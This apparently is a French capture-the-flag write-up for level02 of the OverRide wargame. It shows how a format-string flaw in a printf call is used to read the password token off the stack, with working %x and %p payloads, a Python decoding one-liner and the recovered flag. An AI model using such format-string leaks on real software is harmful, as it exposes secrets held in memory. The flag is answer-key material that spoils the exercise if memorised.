1. La faille se trouve sur la fin du programme.
   ```
   printf("--[ Username: ");
   fgets(format, 100, stdin);
   format[strcspn(format, "\n")] = 0;
   [...]
   printf(format);
   puts(" does not have access!");
   exit(1);
   ```

2. On trouve l'offset du printf.
   ```
   >>> ('%x ' * 100)[:100]
   '%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %'
   ```
   ```
   level02@OverRide:~$ ./level02
   ===== [ Secure Access System v1.0 ] =====
   /***************************************\
   | You must login to access this system. |
   \**************************************/
   --[ Username: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
   --[ Password: pelo
   *****************************************
   ffffe4f0 0 70 2a2a2a2a 2a2a2a2a ffffe6e8 f7ff9a08 6f6c6570 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 25207825 20782520 78252078 25207825 20782520 78252078 does not have access!
   ```
   > On voit la valeur `25207825` => `'25207825'.decode("hex")` => `"% x%"`
   On va donc utiliser la 28e valeur.

4. En sachant que `ptr` (qui contient la valeur du pass) se trouve a la position `rbp-0xa0` et que `format` qui contient notre input se trouve a `rbp-0x70`. On sait qu'il faut decaler notre pointeur de 48bits, etant donne que `%p` affiche 8bits on peut faire le calcul suivant `28 - (48 / 8) = 22` afin de connaitre la position du premier octet du pass. On sait que le token fait `40 char` de long, on peut donc en deduire qu'il faudra afficher 5 fois 8 octets.

5. On affiche les donnees
   ```
   (echo '%22$p %23$p %24$p %25$p %26$p'; echo 'pelo'; ) | ./level02
   ===== [ Secure Access System v1.0 ] =====
   /***************************************\
   | You must login to access this system. |
   \**************************************/
   --[ Username: --[ Password: *****************************************
   0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!

   python -c "print ''.join([v.decode('hex')[::-1] for v in ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']])"
   ```

> Flag: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
